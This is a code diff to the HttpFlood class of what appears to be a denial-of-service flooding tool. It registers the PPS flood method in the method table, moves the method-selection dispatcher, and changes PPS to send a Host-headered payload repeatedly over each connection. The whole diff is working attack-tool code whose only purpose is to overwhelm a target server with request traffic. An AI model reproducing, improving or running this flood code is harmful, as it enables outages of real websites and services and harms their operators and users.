@@ -701,6 +701,7 @@ class HttpFlood(Thread):
             "EVEN": self.EVEN,
             "DOWNLOADER": self.DOWNLOADER,
             "BOMB": self.BOMB,
+            "PPS": self.PPS,
             "KILLER": self.KILLER,
         }
 
@@ -771,6 +772,12 @@ class HttpFlood(Thread):
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
 
+    def select(self, name: str) -> None:
+        self.SENT_FLOOD = self.GET
+        for key, value in self.methods.items():
+            if name == key:
+                self.SENT_FLOOD = value
+                
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
@@ -908,10 +915,12 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def PPS(self) -> None:
+        payload: Any = str.encode(self._defaultpayload +
+                                  f"Host: {self._target.authority}\r\n\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, self._defaultpayload)
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
     def KILLER(self) -> None:
@@ -1219,17 +1228,6 @@ class HttpFlood(Thread):
                     sleep(self._rpc / 15)
                     break
         Tools.safe_close(s)
-
-    def select(self, name: str) -> None:
-        self.SENT_FLOOD = self.GET
-        for key, value in self.methods.items():
-            if name == key:
-                self.SENT_FLOOD = value
-            elif name == "PPS":
-                self.SENT_FLOOD = self.PPS
-                self._defaultpayload = (
-                        self._defaultpayload +
-                        f"Host: {self._target.authority}\r\n\r\n").encode()
 
 
 class ProxyManager:
